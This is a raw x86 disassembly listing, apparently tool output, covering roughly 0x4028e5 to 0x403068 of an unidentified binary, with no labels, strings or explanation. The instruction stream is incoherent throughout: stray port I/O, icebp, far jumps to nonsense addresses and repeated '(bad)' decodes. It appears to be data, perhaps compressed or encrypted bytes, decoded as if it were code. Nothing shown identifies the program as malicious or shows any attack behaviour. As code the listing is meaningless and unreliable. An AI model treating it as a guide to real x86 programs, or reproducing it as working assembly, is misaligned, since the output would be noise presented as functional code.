  4028e5:	mov    BYTE PTR [edi+0x269b546c],al
  4028eb:	cdq    
  4028ec:	outs   dx,DWORD PTR ds:[esi]
  4028ed:	aaa    
  4028ee:	sbb    esi,DWORD PTR [edi+0x6ac72b8c]
  4028f4:	jns    0x402892
  4028f6:	stos   DWORD PTR es:[edi],eax
  4028f7:	out    0xb1,al
  4028f9:	call   DWORD PTR [ebx]
  4028fb:	sub    BYTE PTR [edx],cl
  4028fd:	lods   eax,DWORD PTR ds:[esi]
  4028fe:	aaa    
  4028ff:	cmp    BYTE PTR [eax+0x7d098721],dl
  402905:	cmp    ecx,esi
  402907:	mov    ch,0xb4
  402909:	leave  
  40290a:	dec    esi
  40290c:	imul   ebp,esi,0x65
  40290f:	adc    eax,edx
  402911:	inc    ebp
  402912:	and    ecx,0xb3764d26
  402918:	loop   0x402912
  40291a:	outs   dx,BYTE PTR ds:[esi]
  40291b:	xchg   ebx,eax
  40291c:	mov    esp,0x1058471b
  402921:	sahf   
  402922:	push   eax
  402923:	push   eax
  402924:	sub    BYTE PTR [eax-0x6f187384],0x8c
  40292b:	push   cs
  40292c:	sub    ebx,0xffffffab
  40292f:	add    edi,ebx
  402931:	arpl   WORD PTR [edx],sp
  402933:	out    dx,eax
  402934:	or     al,0xb2
  402936:	jp     0x402919
  402938:	mov    cl,0x52
  40293a:	inc    ecx
  40293b:	cmp    al,0x93
  40293d:	scas   eax,DWORD PTR es:[edi]
  40293e:	sbb    ax,WORD PTR [eax]
  402941:	add    DWORD PTR [edi],ebp
  402943:	aad    0x9
  402945:	cld    
  402946:	mov    ebx,0x26b0aa6d
  40294b:	mov    ebx,0xf64c23b3
  402950:	push   esi
  402951:	retf   
  402952:	enter  0x9824,0x86
  402956:	les    ecx,FWORD PTR [ecx+ebx*8-0x7c]
  40295a:	enter  0xfb04,0x59
  40295e:	inc    ebp
  40295f:	sbb    al,0xc2
  402961:	push   edi
  402962:	sub    DWORD PTR [esp+ecx*4],0x4d04999f
  402969:	dec    ecx
  40296a:	ja     0x4029b6
  40296c:	add    dh,BYTE PTR [edi+0x4302f7d2]
  402972:	and    DWORD PTR [ebx+0x5e887385],ebx
  402978:	std    
  402979:	push   eax
  40297a:	xchg   esp,eax
  40297b:	shr    ecx,0xcc
  40297e:	inc    ecx
  40297f:	jnp    0x4029e4
  402981:	mov    DWORD PTR [esi],edx
  402983:	call   0xa4410bd6
  402988:	ins    DWORD PTR es:[edi],dx
  402989:	cmp    DWORD PTR [esi+0x3e],esi
  40298c:	xor    DWORD PTR [edi],esi
  40298e:	push   eax
  40298f:	sar    edx,1
  402991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402992:	std    
  402993:	jl     0x402937
  402995:	add    esp,ebx
  402997:	mov    ch,0xad
  402999:	arpl   WORD PTR [ebp+0x7e80e2cb],cx
  40299f:	aad    0xce
  4029a1:	addr16 add eax,0xb268e955
  4029a7:	lock add BYTE PTR [ecx-0x24],0xdc
  4029ac:	mov    esi,DWORD PTR [ecx+eax*1+0x1292c3d7]
  4029b3:	cdq    
  4029b4:	js     0x402939
  4029b6:	js     0x402975
  4029b8:	add    DWORD PTR [esi-0x4dacbb46],0x6f7d74e0
  4029c2:	push   0x8291963b
  4029c7:	dec    esi
  4029c8:	cmp    ch,BYTE PTR [edx+0x7ca8efb]
  4029ce:	data16 lods al,BYTE PTR ds:[esi]
  4029d0:	jl     0x402a19
  4029d2:	push   0xffffffea
  4029d4:	leave  
  4029d5:	push   ecx
  4029d6:	xor    al,0x87
  4029d8:	adc    esi,ebp
  4029da:	cmp    ah,BYTE PTR [ecx-0x69]
  4029dd:	shl    BYTE PTR [ebp-0x11],1
  4029e0:	add    DWORD PTR [ecx],ecx
  4029e2:	mov    WORD PTR [ecx+0x39],gs
  4029e5:	pavgw  mm4,mm5
  4029e8:	jae    0x402a63
  4029ea:	mov    ah,0x5d
  4029ec:	push   cs
  4029ed:	sub    ch,dl
  4029ef:	and    al,0x4b
  4029f1:	dec    dh
  4029f3:	mov    bl,BYTE PTR [esi+0x7d10e480]
  4029f9:	and    ebp,DWORD PTR ds:0xb66d5a11
  4029ff:	fisttp DWORD PTR [ebp-0x19]
  402a02:	xor    eax,0x8d9e0771
  402a07:	xchg   esi,eax
  402a08:	xchg   ebx,eax
  402a09:	sub    DWORD PTR [edi],esp
  402a0b:	sub    ecx,esp
  402a0d:	scas   eax,DWORD PTR es:[edi]
  402a0e:	pop    edx
  402a0f:	ins    DWORD PTR es:[edi],dx
  402a10:	fcomp  QWORD PTR [eax+eax*8-0x15c828f0]
  402a17:	(bad)  
  402a18:	mov    edx,0x5ebb1a4d
  402a1d:	das    
  402a1e:	adc    ch,BYTE PTR [edi+0x230a7acf]
  402a24:	mov    edi,0x84461a10
  402a29:	dec    esi
  402a2a:	sub    esi,0x53b63f16
  402a30:	cld    
  402a31:	pop    eax
  402a32:	add    BYTE PTR [ecx],dl
  402a34:	or     DWORD PTR [esi+0x1fb6e33e],esp
  402a3a:	shl    BYTE PTR [ebp+0x99a8074],1
  402a40:	test   al,0x5b
  402a42:	sahf   
  402a43:	les    ecx,FWORD PTR [edi]
  402a45:	mov    ebx,0x3d80b91b
  402a4a:	jae    0x4029fa
  402a4c:	add    dl,al
  402a4e:	test   DWORD PTR [edx+ebp*8],0x1211be56
  402a55:	sbb    ah,BYTE PTR [ecx-0xb43a800]
  402a5b:	enter  0x4390,0x3b
  402a5f:	push   esi
  402a60:	push   0xffffff98
  402a62:	clc    
  402a63:	bnd jl 0x402a49
  402a66:	fs sti 
  402a68:	call   0xe1eec60d
  402a6d:	dec    ebx
  402a6e:	jno    0x402a63
  402a70:	cwde   
  402a71:	fist   DWORD PTR ds:0xdae2f725
  402a77:	mov    dl,0xe9
  402a79:	sbb    esp,ecx
  402a7b:	jae    0x402a95
  402a7d:	or     DWORD PTR ds:0x8013284e,eax
  402a83:	fcmovnbe st,st(1)
  402a85:	sti    
  402a86:	push   edi
  402a87:	repz int3 
  402a89:	fwait
  402a8a:	push   ecx
  402a8b:	dec    esp
  402a8c:	jg     0x402af2
  402a8e:	int3   
  402a8f:	fdivrp st(6),st
  402a91:	inc    esi
  402a92:	adc    esp,DWORD PTR [esi-0xa322c5b]
  402a98:	fimul  WORD PTR [ecx+0xe]
  402a9b:	and    ch,BYTE PTR [ebp-0x5f]
  402a9e:	and    DWORD PTR [eax-0x52],edi
  402aa1:	mov    bh,0x51
  402aa3:	mov    edx,0xdc1927ac
  402aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aa9:	jmp    0xfd1ee01a
  402aae:	mov    ecx,0x52e1ce72
  402ab3:	xchg   ebp,eax
  402ab4:	inc    esp
  402ab5:	ins    BYTE PTR es:[edi],dx
  402ab6:	fwait
  402ab7:	and    edx,ebp
  402ab9:	xchg   ebx,eax
  402aba:	mov    cl,0x94
  402abc:	mov    esi,0x97e78bb7
  402ac1:	mov    esp,0xe36198ef
  402ac6:	and    dh,0xfc
  402ac9:	mov    ?,WORD PTR ds:0x5550d960
  402acf:	mov    ds:0x666fcb24,eax
  402ad4:	sub    DWORD PTR [edx-0x30],edx
  402ad7:	xor    dh,BYTE PTR [ecx+ecx*1-0x18]
  402adb:	push   ecx
  402adc:	in     al,0xe9
  402ade:	cmp    DWORD PTR [edx],0x344d24d5
  402ae4:	push   cs
  402ae5:	adc    dl,ah
  402ae7:	aaa    
  402ae8:	cmp    eax,DWORD PTR [edx+eax*1-0x19]
  402aec:	test   BYTE PTR [ebp+edx*4+0x12],dh
  402af0:	sbb    edx,esi
  402af2:	push   ebx
  402af3:	(bad)  
  402af4:	pop    edi
  402af5:	adc    BYTE PTR [ebx-0x1741cdf0],bh
  402afb:	inc    eax
  402afc:	push   ebx
  402afd:	leave  
  402afe:	loopne 0x402b4c
  402b00:	dec    ecx
  402b01:	mov    DWORD PTR [edx],edi
  402b03:	push   ecx
  402b04:	or     DWORD PTR [ebx],edx
  402b06:	pop    ebp
  402b07:	ins    DWORD PTR es:[edi],dx
  402b08:	dec    eax
  402b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b0a:	(bad)  
  402b0c:	js     0x402b46
  402b0e:	fmul   DWORD PTR [ebp-0x5a]
  402b11:	bound  esi,QWORD PTR [ecx-0xf]
  402b14:	leave  
  402b15:	repz icebp 
  402b17:	jno    0x402b4d
  402b19:	in     eax,dx
  402b1a:	iret   
  402b1b:	or     ebx,ecx
  402b1d:	jge    0x402b02
  402b1f:	addr16 pushf 
  402b21:	cmp    BYTE PTR [eax+0x5],ah
  402b24:	add    dl,BYTE PTR [eax]
  402b26:	mov    ebp,0x67c055ca
  402b2b:	push   ebx
  402b2c:	mov    esp,0x1c3cb595
  402b31:	js     0x402b9f
  402b33:	gs loopne 0x402b16
  402b36:	icebp  
  402b37:	gs pushf 
  402b39:	jae    0x402ae2
  402b3b:	jns    0x402bae
  402b3d:	pop    edx
  402b3e:	icebp  
  402b3f:	mov    WORD PTR [edx],ds
  402b41:	call   0x91a7:0xe47417ea
  402b48:	dec    edi
  402b49:	and    edx,DWORD PTR [edx]
  402b4b:	sbb    ecx,DWORD PTR [edx+0x5f]
  402b4e:	cld    
  402b4f:	adc    BYTE PTR [ebx-0x677d38c3],0xdc
  402b56:	inc    ecx
  402b57:	xchg   edx,eax
  402b58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b59:	call   0x5087:0x2cca2b7e
  402b60:	sbb    BYTE PTR [ebx+0x3b],0x96
  402b64:	mov    ebx,0x31daa1bb
  402b69:	cdq    
  402b6a:	mov    ah,0xfa
  402b6c:	out    dx,al
  402b6d:	ds dec esp
  402b6f:	fcomp  DWORD PTR [edi]
  402b71:	sar    BYTE PTR [eax+0x233e1f98],cl
  402b77:	dec    ebx
  402b78:	xchg   BYTE PTR [ebp+0x1c],bl
  402b7b:	repz push esp
  402b7d:	pop    ebx
  402b7e:	adc    DWORD PTR [ecx+0x52],ebp
  402b81:	push   edx
  402b82:	push   ss
  402b83:	retf   
  402b84:	adc    ah,bl
  402b86:	mov    ebx,0x3183f8e2
  402b8b:	out    dx,al
  402b8c:	sub    ebp,esi
  402b8e:	nop
  402b8f:	clc    
  402b90:	lock js 0x402bfe
  402b93:	add    bh,dh
  402b95:	mov    dh,0xe9
  402b97:	in     eax,0xe
  402b99:	jg     0x402bdc
  402b9b:	fdiv   DWORD PTR [ecx]
  402b9d:	xchg   edx,eax
  402b9e:	jns    0x402b5d
  402ba0:	dec    esp
  402ba1:	cmp    dh,BYTE PTR [eax]
  402ba3:	enter  0x1e0a,0x62
  402ba7:	push   edi
  402ba8:	pop    ds
  402ba9:	jo     0x402c08
  402bab:	ins    DWORD PTR es:[edi],dx
  402bac:	inc    ecx
  402bad:	fist   DWORD PTR [esi+0x293bcce3]
  402bb3:	mov    eax,0xf248dd57
  402bb8:	xlat   BYTE PTR ds:[ebx]
  402bb9:	sbb    BYTE PTR [ebx+eiz*4-0x39],dl
  402bbd:	push   0x6f
  402bbf:	mov    ds:0x5d05028d,al
  402bc4:	inc    eax
  402bc5:	mov    fs,WORD PTR [eax+0x1c3e7c4b]
  402bcb:	retf   
  402bcc:	add    BYTE PTR [ebx+0x52],ah
  402bcf:	inc    edx
  402bd0:	sub    DWORD PTR [esp+eax*2],ecx
  402bd3:	cmc    
  402bd4:	mov    BYTE PTR [ebx],0xbf
  402bd7:	or     edi,DWORD PTR [ebx+esi*8+0x54]
  402bdb:	iret   
  402bdc:	retf   0x6d5
  402bdf:	mov    bh,0x41
  402be1:	rcr    BYTE PTR [ecx],1
  402be3:	loop   0x402c23
  402be5:	out    dx,al
  402be6:	xchg   edi,eax
  402be7:	push   cs
  402be8:	jmp    0xb8749c59
  402bed:	jp     0x402c1f
  402bef:	leave  
  402bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bf1:	add    dh,BYTE PTR [esi]
  402bf3:	or     bl,BYTE PTR [ecx]
  402bf5:	pop    ds
  402bf6:	mov    ebp,es
  402bf8:	fbld   TBYTE PTR [edi-0x32]
  402bfb:	xor    eax,0xddce9211
  402c00:	mov    bh,al
  402c02:	stos   DWORD PTR es:[edi],eax
  402c03:	sub    ecx,esi
  402c05:	dec    edx
  402c06:	dec    ecx
  402c07:	mov    dh,0xdd
  402c09:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c0b:	fwait
  402c0c:	or     bl,dl
  402c0e:	sub    BYTE PTR [ecx+ecx*2+0x399e0579],dh
  402c15:	adc    dh,BYTE PTR [eax-0x74]
  402c18:	aas    
  402c19:	mov    ebp,0xe9fc72d7
  402c1e:	add    eax,0xfd90db14
  402c23:	fstp   DWORD PTR [edi+0xa525200]
  402c29:	sub    BYTE PTR [esi-0x6a52d3fd],0xe9
  402c30:	push   ecx
  402c31:	(bad)  
  402c33:	mov    ds:0x632625c0,al
  402c38:	test   eax,0x3fa0efd0
  402c3d:	cmp    eax,0x15e9ac2a
  402c42:	sbb    ah,ah
  402c44:	in     al,0x55
  402c46:	inc    edi
  402c47:	repz scas eax,DWORD PTR es:[edi]
  402c49:	mov    dh,0x74
  402c4b:	das    
  402c4c:	out    0x9b,eax
  402c4e:	pushf  
  402c4f:	jg     0x402c36
  402c51:	add    DWORD PTR [ebp-0x75],edx
  402c54:	sbb    BYTE PTR [edi],dl
  402c56:	fcomp  st(4)
  402c58:	pop    ds
  402c59:	cmp    BYTE PTR [edi-0x2ee2915f],ch
  402c5f:	sbb    ch,BYTE PTR [ebp-0x781ea1da]
  402c65:	nop
  402c66:	das    
  402c67:	int3   
  402c68:	pop    ecx
  402c69:	dec    ecx
  402c6a:	loope  0x402bf2
  402c6c:	sbb    dh,BYTE PTR [eax+0x25922237]
  402c72:	cmp    ebx,DWORD PTR [ecx-0x4a]
  402c75:	repz and DWORD PTR ds:0x49b065e8,0x49540774
  402c80:	push   esp
  402c81:	xlat   BYTE PTR ds:[ebx]
  402c82:	jmp    0x402c06
  402c84:	mov    ah,0xee
  402c86:	int    0x6f
  402c88:	loopne 0x402c4d
  402c8a:	loopne 0x402c9a
  402c8c:	push   es
  402c8d:	add    al,0x3a
  402c8f:	sbb    dl,BYTE PTR [edx-0x47]
  402c92:	nop
  402c93:	mov    cl,0xf7
  402c95:	mov    BYTE PTR [eax+0x72],cl
  402c98:	ds call 0xb1e6df40
  402c9e:	sub    ecx,edx
  402ca0:	inc    edx
  402ca1:	cmp    BYTE PTR [eax],dl
  402ca3:	enter  0xd191,0xfb
  402ca7:	xor    dh,BYTE PTR [ebx+0x18]
  402caa:	arpl   WORD PTR [ecx],ax
  402cac:	sbb    BYTE PTR [esi+0xe],bl
  402caf:	call   0x74656a95
  402cb4:	mov    ds:0xe4428e2c,eax
  402cb9:	pop    ecx
  402cba:	sub    DWORD PTR [eax-0x6d],edi
  402cbd:	pop    ds
  402cbe:	jle    0x402d36
  402cc0:	cld    
  402cc1:	mov    ch,0xdd
  402cc3:	xchg   esi,eax
  402cc4:	(bad)  
  402cc5:	dec    edi
  402cc6:	xchg   ch,dh
  402cc8:	jo     0x402cba
  402cca:	cmp    esi,esp
  402ccc:	test   eax,0x6dedda05
  402cd1:	xor    edx,esp
  402cd3:	ss xchg esp,eax
  402cd5:	xor    ebx,DWORD PTR [edi+0x58052287]
  402cdb:	pop    es
  402cdc:	pop    es
  402cdd:	mov    ah,0xb0
  402cdf:	xor    BYTE PTR [ebp-0x51],al
  402ce2:	imul   ebx,DWORD PTR [edi+eax*1-0x41],0x9f9003c1
  402cea:	ret    
  402ceb:	fnsave [edx+0x1c4c8977]
  402cf1:	out    0xb4,al
  402cf3:	inc    ebp
  402cf4:	in     eax,dx
  402cf5:	xchg   BYTE PTR [ebx],bh
  402cf7:	ds dec edi
  402cf9:	lods   al,BYTE PTR ds:[esi]
  402cfa:	(bad)  
  402cfb:	cli    
  402cfc:	fdiv   QWORD PTR [ebx+edi*2-0x58]
  402d00:	jmp    0x8220:0xdd7a3462
  402d07:	or     al,0xf5
  402d09:	aaa    
  402d0a:	out    dx,eax
  402d0b:	icebp  
  402d0c:	pop    es
  402d0d:	push   esi
  402d0e:	inc    esp
  402d0f:	cmc    
  402d10:	mov    ebx,0xb852d38c
  402d15:	mov    BYTE PTR [edi],dh
  402d17:	jo     0x402c9c
  402d19:	gs pop edi
  402d1b:	int3   
  402d1c:	xchg   DWORD PTR [edx],ebp
  402d1e:	pop    ss
  402d1f:	jp     0x402d8e
  402d21:	mov    al,0x1d
  402d23:	push   ebp
  402d24:	(bad)  
  402d25:	pushf  
  402d26:	out    dx,al
  402d27:	push   cs
  402d28:	stc    
  402d29:	lea    edi,[ecx-0x9db4e66]
  402d2f:	jns    0x402d95
  402d31:	cwde   
  402d32:	xor    DWORD PTR ds:0xa5947385,edx
  402d38:	pop    es
  402d39:	inc    ebx
  402d3a:	or     esp,DWORD PTR [ebp+0x5a]
  402d3d:	mov    ds:0x91dacfb9,al
  402d42:	cmp    edi,DWORD PTR ss:[eax+0xd]
  402d46:	xchg   edx,eax
  402d47:	pop    edx
  402d48:	je     0x402d82
  402d4a:	out    dx,eax
  402d4b:	push   edx
  402d4c:	or     al,0xca
  402d4e:	jne    0x402d2f
  402d50:	test   eax,0x946e0ebf
  402d55:	mov    esp,0xe14b5607
  402d5a:	test   al,0xc7
  402d5c:	lods   al,BYTE PTR ds:[esi]
  402d5d:	add    dh,BYTE PTR [ebx]
  402d5f:	leave  
  402d60:	inc    ecx
  402d61:	aaa    
  402d62:	jns    0x402d0a
  402d64:	imul   ebp,esp,0xd9023b16
  402d6a:	pop    ss
  402d6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d6c:	shl    BYTE PTR [esi+eax*1],cl
  402d6f:	mov    al,0x51
  402d71:	lds    edi,FWORD PTR [ecx-0x7e529db2]
  402d77:	ins    DWORD PTR es:[edi],dx
  402d78:	lods   eax,DWORD PTR ds:[esi]
  402d79:	inc    esp
  402d7a:	fsub   QWORD PTR [ebp+edi*2-0x37]
  402d7e:	int3   
  402d7f:	ins    DWORD PTR es:[edi],dx
  402d80:	cs jecxz 0x402d37
  402d83:	data16 lods al,BYTE PTR ds:[esi]
  402d85:	shl    DWORD PTR [esp+eiz*4-0x3a82083],cl
  402d8c:	pop    eax
  402d8d:	cs call 0x9b7:0x79288ef9
  402d95:	xchg   esp,eax
  402d96:	lahf   
  402d97:	std    
  402d98:	mov    dl,0xf5
  402d9a:	sbb    eax,DWORD PTR ds:0xa94392f9
  402da0:	push   0xdc52b7c1
  402da5:	mov    esp,0xd8ed5d6e
  402daa:	popf   
  402dab:	and    eax,0xffffffa5
  402dae:	jbe    0x402dae
  402db0:	sbb    al,0x5e
  402db2:	stos   DWORD PTR es:[edi],eax
  402db3:	inc    ecx
  402db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402db5:	lahf   
  402db6:	or     dh,cl
  402db8:	jne    0x402dd0
  402dba:	test   eax,0xbed58a74
  402dbf:	ja     0x402dc5
  402dc1:	in     al,dx
  402dc2:	int3   
  402dc3:	mov    ch,BYTE PTR [edx-0x330ebb9f]
  402dc9:	sbb    ebx,edi
  402dcb:	jae    0x402dc8
  402dcd:	inc    esi
  402dce:	jg     0x402de5
  402dd0:	in     eax,dx
  402dd1:	pop    esp
  402dd2:	out    0x95,eax
  402dd4:	xor    dh,BYTE PTR cs:[ebp+0x59]
  402dd8:	inc    edx
  402dd9:	mov    BYTE PTR [esi+0x29b64dc1],dl
  402ddf:	popa   
  402de0:	jge    0x402dab
  402de2:	jmp    0xee2cb0b0
  402de7:	add    BYTE PTR ss:[esi],0xac
  402deb:	hlt    
  402dec:	jae    0x402d85
  402dee:	addr16 popa 
  402df0:	dec    esp
  402df1:	xchg   ebp,eax
  402df2:	retf   0x45c4
  402df5:	test   al,0x4c
  402df7:	dec    BYTE PTR [edi-0x9]
  402dfa:	imul   ebx,DWORD PTR [eax],0xffffffa6
  402dfd:	ret    
  402dfe:	inc    ebp
  402dff:	push   ebx
  402e00:	add    BYTE PTR [edx],bl
  402e02:	and    cl,ch
  402e04:	mov    ch,0x9a
  402e06:	nop
  402e07:	call   0x9c8aa6d0
  402e0c:	cwde   
  402e0d:	loop   0x402dd0
  402e0f:	pop    ds
  402e10:	repz in al,dx
  402e12:	xchg   edx,eax
  402e13:	push   ss
  402e14:	mov    ds:0xd04bf3ea,eax
  402e19:	inc    eax
  402e1a:	mov    eax,ds:0x6c62c3a3
  402e1f:	xchg   esp,eax
  402e20:	aad    0xd7
  402e22:	icebp  
  402e23:	fcmove st,st(0)
  402e25:	pop    edx
  402e26:	adc    DWORD PTR [edi],edi
  402e28:	sahf   
  402e29:	mov    esi,0xaa008e17
  402e2e:	xchg   esi,eax
  402e2f:	sbb    edi,DWORD PTR [ebx-0x75f72367]
  402e35:	mov    ?,esp
  402e37:	sub    eax,DWORD PTR [eax+0xf5a7020]
  402e3d:	push   esp
  402e3e:	mov    edi,0x16dc687a
  402e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e44:	aaa    
  402e45:	stos   BYTE PTR es:[edi],al
  402e46:	test   al,0x82
  402e48:	pop    ds
  402e49:	jno    0x402e6c
  402e4b:	jb     0x402e09
  402e4d:	test   BYTE PTR [edi],ch
  402e4f:	out    0xcb,eax
  402e51:	jnp    0x402e53
  402e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e54:	dec    eax
  402e55:	aam    0xb7
  402e57:	gs xchg ebx,eax
  402e59:	pop    es
  402e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e5b:	stos   BYTE PTR es:[edi],al
  402e5c:	enter  0x1fee,0x9e
  402e60:	jg     0x402e7f
  402e62:	xchg   esp,eax
  402e63:	mov    dl,0xf
  402e65:	and    BYTE PTR [ecx],0x9f
  402e68:	bound  eax,QWORD PTR [ebp-0x256b6e62]
  402e6e:	xchg   esp,eax
  402e6f:	xchg   esp,eax
  402e70:	xor    eax,0x303b06b7
  402e75:	xchg   edx,eax
  402e76:	xchg   DWORD PTR [ebp+0x446bc654],ebx
  402e7c:	(bad)  
  402e7d:	cmp    DWORD PTR [ebx+0x59f7abb],eax
  402e83:	mov    DWORD PTR [ebx-0x19],edi
  402e86:	jl     0x402e15
  402e88:	and    eax,0x174775a4
  402e8d:	daa    
  402e8e:	xor    al,0x1f
  402e90:	pop    ss
  402e91:	sub    DWORD PTR [ecx+0x28],eax
  402e94:	adc    ecx,DWORD PTR [eax]
  402e96:	xchg   DWORD PTR ds:[edi+0x7d],esp
  402e9a:	adc    ch,BYTE PTR [edx+0x9]
  402e9d:	fild   QWORD PTR [esi+0x2e]
  402ea0:	pop    edx
  402ea1:	pop    ebx
  402ea2:	and    eax,0xc9d96d24
  402ea7:	out    0x60,eax
  402ea9:	mov    al,ds:0x49c4982a
  402eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eaf:	inc    edx
  402eb0:	pop    ds
  402eb1:	cs sub eax,0xdaacf27a
  402eb7:	sub    ch,al
  402eb9:	out    0xd1,eax
  402ebb:	xlat   BYTE PTR ds:[ebx]
  402ebc:	lea    edx,[edx-0x5ed3c5c]
  402ec2:	sbb    DWORD PTR [eax+0x673ca6f3],esp
  402ec8:	daa    
  402ec9:	dec    ecx
  402eca:	push   ecx
  402ecb:	js     0x402f3d
  402ecd:	aas    
  402ece:	sub    BYTE PTR [edx],cl
  402ed0:	fucomp st(4)
  402ed2:	enter  0x49d0,0xd9
  402ed6:	xchg   edx,eax
  402ed7:	xchg   edx,esi
  402ed9:	fs popf 
  402edb:	jnp    0x402f3d
  402edd:	xor    ebx,DWORD PTR [ebx]
  402edf:	push   ds
  402ee0:	fcos   
  402ee2:	das    
  402ee3:	dec    ebp
  402ee4:	stc    
  402ee5:	(bad)  
  402ee6:	rcr    esp,0xe1
  402ee9:	and    al,0x82
  402eeb:	jbe    0x402eee
  402eed:	hlt    
  402eee:	ss and edx,edi
  402ef1:	sub    al,0x1e
  402ef3:	pop    edx
  402ef4:	inc    ebx
  402ef5:	aas    
  402ef6:	scas   al,BYTE PTR es:[edi]
  402ef7:	not    ah
  402ef9:	mov    esi,DWORD PTR [ebx]
  402efb:	jns    0x402ea1
  402efd:	shr    BYTE PTR [eax-0x65],cl
  402f00:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  402f02:	or     eax,0xecf7148e
  402f07:	shr    BYTE PTR [ebp+0x561b3aff],0x63
  402f0e:	mov    eax,0xbcc1b4f0
  402f13:	enter  0xc4e1,0x4b
  402f17:	test   eax,0xe1b8c24a
  402f1c:	push   ebx
  402f1d:	xor    eax,0xb7f6b7bb
  402f22:	mov    edx,eax
  402f24:	jb     0x402eb6
  402f26:	jge    0x402efa
  402f28:	pop    ebp
  402f29:	jge    0x402f5a
  402f2b:	mov    ebx,0xa8b97590
  402f30:	clc    
  402f31:	adc    dh,BYTE PTR [edx+0x10]
  402f34:	sahf   
  402f35:	dec    eax
  402f36:	dec    ebp
  402f37:	scas   eax,DWORD PTR es:[edi]
  402f38:	outs   dx,BYTE PTR ds:[esi]
  402f39:	ror    BYTE PTR [ebx-0x700f2c],cl
  402f3f:	enter  0x8e97,0xa9
  402f43:	test   BYTE PTR [edx+0x65bbbcc3],cl
  402f49:	stos   DWORD PTR es:[edi],eax
  402f4a:	(bad)  
  402f4b:	dec    DWORD PTR [ebx]
  402f4d:	not    BYTE PTR [edx]
  402f4f:	fucomp st(2)
  402f51:	cld    
  402f52:	push   cs
  402f53:	out    0xde,eax
  402f55:	imul   DWORD PTR [edx+edi*4-0x3d]
  402f59:	test   al,0xf0
  402f5b:	adc    BYTE PTR [ebp+0x22],cl
  402f5e:	add    edi,DWORD PTR [ecx+0x67f7ebff]
  402f64:	fisubr DWORD PTR [edi-0x533a1d70]
  402f6a:	jle    0x402f44
  402f6c:	jmp    0xaaba:0x664e89ec
  402f73:	cs inc ebp
  402f75:	mov    WORD PTR [ebx+0x790884a2],gs
  402f7b:	mov    eax,0x4b8e0a67
  402f80:	push   edx
  402f82:	retf   
  402f83:	outs   dx,DWORD PTR ds:[esi]
  402f84:	push   ds
  402f85:	out    dx,al
  402f86:	call   0x373d872
  402f8b:	or     eax,0xce49c3d8
  402f90:	and    BYTE PTR [ecx-0xb],al
  402f93:	cmp    BYTE PTR [edx+eax*8-0x2fb92663],dl
  402f9a:	pop    ss
  402f9b:	mov    ecx,0xb22d4e15
  402fa0:	repnz into 
  402fa2:	test   al,0x92
  402fa4:	test   eax,0xc2062775
  402fa9:	lods   al,BYTE PTR ds:[esi]
  402faa:	aad    0x5b
  402fac:	mov    ebp,edi
  402fae:	push   ebp
  402faf:	mov    ebp,0xb79d579d
  402fb4:	rcr    bh,cl
  402fb6:	out    0x16,al
  402fb8:	add    DWORD PTR [esp+edi*8+0x2a587402],edi
  402fbf:	dec    ecx
  402fc0:	sbb    al,0x0
  402fc2:	push   eax
  402fc3:	and    ah,BYTE PTR [ecx+0x0]
  402fc6:	or     eax,0xc2a8944
  402fcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fcc:	jne    0x402fd1
  402fce:	push   eax
  402fcf:	jl     0x403039
  402fd1:	inc    eax
  402fd2:	stos   DWORD PTR es:[edi],eax
  402fd3:	jae    0x40300f
  402fd5:	mov    edi,0x9fca154e
  402fda:	or     DWORD PTR [ebx-0x7f609adb],edi
  402fe0:	das    
  402fe1:	dec    esi
  402fe2:	je     0x402f9b
  402fe4:	loop   0x402f6d
  402fe6:	jbe    0x402f87
  402fe8:	ins    DWORD PTR es:[edi],dx
  402fe9:	movhlps xmm4,xmm0
  402fec:	sub    ebx,DWORD PTR [ecx]
  402fee:	test   DWORD PTR [ebp+0x48],ebx
  402ff1:	fwait
  402ff2:	sub    al,0x53
  402ff4:	cld    
  402ff5:	or     eax,0xacca3899
  402ffa:	xchg   ecx,eax
  402ffb:	xchg   edi,eax
  402ffc:	sbb    al,0xc4
  402ffe:	mov    bh,BYTE PTR [ebp-0x34]
  403001:	cmp    dl,0xb2
  403004:	(bad)  
  403005:	push   esp
  403006:	outs   dx,DWORD PTR ds:[esi]
  403007:	push   0x4dcabf80
  40300c:	mov    WORD PTR [ebx+ebp*8],ds
  40300f:	pop    edi
  403010:	push   ss
  403011:	pop    edi
  403012:	lea    esp,[esi-0x7c36406]
  403018:	out    dx,eax
  403019:	jbe    0x403066
  40301b:	fmul   DWORD PTR [ebp-0x4d59280f]
  403021:	outs   dx,DWORD PTR ds:[esi]
  403022:	out    0xb0,eax
  403024:	mov    bl,0xc1
  403026:	pop    esi
  403027:	xchg   ebx,eax
  403028:	shl    edx,0x64
  40302b:	xchg   BYTE PTR [eax-0x75],ah
  40302e:	hlt    
  40302f:	test   BYTE PTR [edx-0x7f4f8589],cl
  403035:	rcl    BYTE PTR [ecx+0xe],1
  403038:	jle    0x40304a
  40303a:	jmp    0x34be16a
  40303f:	(bad)  
  403041:	mov    al,0xb1
  403043:	cmp    DWORD PTR [ebx+0x75],ecx
  403046:	aad    0xdd
  403048:	loope  0x402fca
  40304a:	mov    ch,0x3f
  40304c:	jno    0x402fd5
  40304e:	xchg   ebx,eax
  40304f:	aad    0x66
  403051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403052:	push   0x5d
  403054:	lods   eax,DWORD PTR ss:[esi]
  403056:	inc    eax
  403057:	inc    ebp
  403058:	loope  0x403047
  40305a:	mov    al,BYTE PTR [edx+edi*8]
  40305d:	xchg   ebx,eax
  40305e:	retf   0x3cb4
  403061:	cmp    eax,0x16df5740
  403066:	ror    ah,1
  403068:	or     bh,BYTE PTR [ecx+edx*2]
